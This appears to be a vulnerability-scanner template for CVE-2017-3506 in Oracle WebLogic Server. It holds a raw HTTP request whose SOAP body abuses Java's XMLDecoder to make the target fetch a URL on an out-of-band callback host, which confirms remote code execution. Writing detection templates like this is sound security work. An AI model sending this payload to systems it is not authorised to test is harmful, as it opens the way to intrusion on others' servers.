id: cve-2017-3506
info:
  author: pdteam
  description: Vulnerability in the Oracle WebLogic Server component of Oracle Fusion
    Middleware (Web Services). Supported versions that are affected are 10.3.6.0,
    12.1.3.0, 12.2.1.0, 12.2.1.1 and 12.2.1.2. Difficult to exploit vulnerability
    allows unauthenticated attacker with network access via HTTP to compromise Oracle
    WebLogic Server.
  name: Oracle Weblogic Remote OS Command Execution
  reference: '- https://hackerone.com/reports/810778

    - https://nvd.nist.gov/vuln/detail/CVE-2017-3506

    '
  severity: high
  tags: cve,cve2017,weblogic,oracle,rce,oob
requests:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  raw:
  - "POST /wls-wsat/RegistrationRequesterPortType HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ text/xml\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101\
    \ Firefox/56.0,\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,\n\
    Content-Type: text/xml;charset=UTF-8\nContent-Length: 873\n\n<soapenv:Envelope\
    \ xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soapenv:Header>\n\
    \    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n\
    \      <java version=\"1.8\" class=\"java.beans.XMLDecoder\">\n        <void id=\"\
    url\" class=\"java.net.URL\">\n          <string>http://{{interactsh-url}}</string>\n\
    \        </void>\n        <void idref=\"url\">\n          <void id=\"stream\"\
    \ method =\"openStream\"/>\n        </void>\n      </java>\n    </work:WorkContext>\n\
    \    </soapenv:Header>\n  <soapenv:Body/>\n</soapenv:Envelope>\n"
